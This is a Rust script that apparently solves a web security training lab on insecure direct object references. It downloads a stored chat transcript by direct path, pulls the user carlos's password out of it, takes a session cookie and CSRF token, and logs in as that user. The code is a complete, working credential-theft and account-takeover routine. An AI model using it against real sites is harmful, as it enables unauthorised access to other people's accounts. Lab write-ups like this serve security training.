/*******************************************************************************
*
* Lab: Insecure direct object references
*
* Hack Steps: 
*      1. Fetch the 1.txt log file
*      2. Extract carlos password from the log file
*      3. Fetch the login page to get a valid session and the csrf token
*      4. Login as carlos
*
********************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a7f00ca042d81cf80c3b21000c00066.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the 1.txt log file.. ");
    flush_terminal();

    let log_file = fetch("/download-transcript/1.txt");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting password from the log file.. ");
    flush_terminal();

    let file_content = log_file.text().unwrap();
    let carlos_password = capture_pattern_from_text(r"password is (\w+)", &file_content);

    println!("{} => {}", "OK".green(), carlos_password.yellow());
    print!("⦗3⦘ Fetching the login page to get a valid session and the csrf token.. ");
    flush_terminal();

    let login_page = fetch("/login");
    let session = get_session_cookie(&login_page);
    let csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗4⦘ Logging in as carlos.. ");
    flush_terminal();

    let login_as_calros = WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("password", &carlos_password),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as carlos".red()));

    println!("{}", "OK".green());
    print!("⦗5⦘ Fetching carlos profile.. ");
    flush_terminal();

    let carlos_session = get_session_cookie(&login_as_calros);
    fetch_with_session("/my-account", &carlos_session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
